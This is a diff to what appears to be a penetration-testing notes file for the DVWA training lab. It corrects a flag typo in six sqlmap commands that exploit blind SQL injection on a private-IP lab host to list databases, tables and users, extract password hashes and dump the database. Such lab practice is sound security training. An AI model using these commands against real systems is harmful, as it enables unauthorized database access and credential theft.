@@ -42,14 +42,14 @@ qwerty123
 
 ## 4. Blind SQL injection with SQLmap
 ### Lists databases
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –dbs
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –dbs
 ### Lists the tables on a specific database
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --tables
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --tables
 ### Lists all users
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –users
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –users
 ### Users and passwords
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" --users --passwords
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" --users --passwords
 ### Get tables structure
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --columns
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --columns
 ### Dump database information
-    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" -- cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --dump
+    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --dump
